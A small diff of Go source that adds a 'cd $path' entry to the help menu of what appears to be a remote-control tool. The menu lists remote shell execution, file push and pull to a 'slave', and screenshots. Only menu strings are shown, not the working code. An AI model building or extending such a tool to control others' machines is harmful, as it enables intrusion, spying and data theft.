@@ -35,6 +35,7 @@ func connHandler(token string, sock socket.Socket){
     case "help":
       fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("help"), "Show this help message.")
       fmt.Printf("\t%s\t%s\n", color.HiBlueString("shell $cmd"), "Execute shell command.")
+      fmt.Printf("\t%s\t%s\n", color.HiBlueString("cd $path"), "Chdir to $path.")
       fmt.Printf("\t%s\t%s\n", color.HiBlueString("push $file"), "Send file to slave.")
       fmt.Printf("\t%s\t%s\n", color.HiBlueString("pull $file"), "Receive file from slave.")
       fmt.Printf("\t%s\t%s\n", color.HiBlueString("screenshot"), "Take a screenshot.")
